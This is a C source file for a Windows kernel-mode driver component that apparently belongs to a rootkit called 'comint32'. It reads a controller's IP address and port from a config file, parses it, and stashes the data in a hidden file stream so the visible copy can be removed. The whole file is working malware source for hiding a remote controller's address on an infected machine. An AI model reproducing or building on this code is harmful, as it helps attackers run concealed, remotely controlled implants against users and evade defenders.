// ConfigManager
// Copyright Ric Vieler, 2006
// First try c:\config32
// If it's there, save as MASTER_FILE:config32 and delete c:\config32
// If it's not there, try MASTER_FILE:configFile
// If that doesn't exist, quit!

#include "ntddk.h"
#include "fileManager.h"
#include "configManager.h"

// Set the controllers IP and port
NTSTATUS Configure()
{
	CHAR		data[22];
	SHORT		vis = 0; 
	SHORT		loop; 
	SHORT		dataIndex; 
	SHORT		addressIndex;
	ULONG		fileSize;
	PHANDLE		fileHandle;

	// Need to know who to connect to
	if( NT_SUCCESS( GetFile( L"\\??\\C:\\config32", data, 21, &fileSize ) ) )
	{
		DbgPrint("comint32: Reading config from visible file.");
		vis = 1;
	}
	else
	{
		if( NT_SUCCESS( GetFile( L"config32", data, 21, &fileSize ) ) )
		{
			DbgPrint("comint32: Reading config from hidden file.");
		}
		else
		{
			DbgPrint("comint32: Error. Could not find a config file.");
			return STATUS_UNSUCCESSFUL;
		}
	}
		
	// Parse master address and port into aaa.bbb.ccc.ddd:eeeee
	dataIndex = 0;
	addressIndex = 0;
	// First 3 are xxx of xxx.111.111.111:11111
	for( loop = 0; loop < 3; loop++ )
		masterAddress1[addressIndex++] = data[dataIndex++];
	masterAddress1[addressIndex] = 0;
	addressIndex = 0; // reset
	dataIndex++; // skip the dot
	// Next 3 are xxx of 111.xxx.111.111:11111
	for( loop = 0; loop < 3; loop++ )
		masterAddress2[addressIndex++] = data[dataIndex++];
	masterAddress2[addressIndex] = 0;
	addressIndex = 0; // reset
	dataIndex++; // skip the dot
	// Next 3 are xxx of 111.111.xxx.111:11111
	for( loop = 0; loop < 3; loop++ )
		masterAddress3[addressIndex++] = data[dataIndex++];
	masterAddress3[addressIndex] = 0;
	addressIndex = 0; // reset
	dataIndex++; // skip the dot
	// Next 3 are xxx of 111.111.111.xxx:11111
	for( loop = 0; loop < 3; loop++ )
		masterAddress4[addressIndex++] = data[dataIndex++];
	masterAddress4[addressIndex] = 0;
	addressIndex = 0; // reset
	dataIndex++; // skip the semicolon
	// Next 5 are xxxxx of 111.111.111.111:xxxxx (port)
	for( loop = 0; loop < 5; loop++ )
		masterPort[addressIndex++] = data[dataIndex++];
	masterPort[addressIndex] = 0;

	DbgPrint( "comint32: Using %s.%s.%s.%s:%s",
		 masterAddress1,
		 masterAddress2,
		 masterAddress3,
		 masterAddress4,
		 masterPort);

	if( vis == 1 )
	{
		DbgPrint("comint32: Saving config to hidden file.");
		PutFile( L"config32", data, fileSize );
		DbgPrint("comint32: You may delete the visible file.");
	}

	return STATUS_SUCCESS;
}
